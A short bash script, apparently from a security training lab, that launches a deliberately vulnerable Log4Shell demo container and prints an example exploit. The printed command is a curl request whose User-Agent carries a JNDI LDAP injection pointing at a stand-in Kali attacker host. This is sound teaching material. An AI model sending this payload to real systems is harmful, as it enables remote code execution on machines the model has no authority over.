#!/bin/bash
docker container run --name 4-9_log4shell --rm -d -p 8888:8080 korteke/log4shell-demo

echo "Container running! Exploit with"
echo curl -A \${jndi:ldap://kali-ip:1389/a} http://pwst-server:8888/
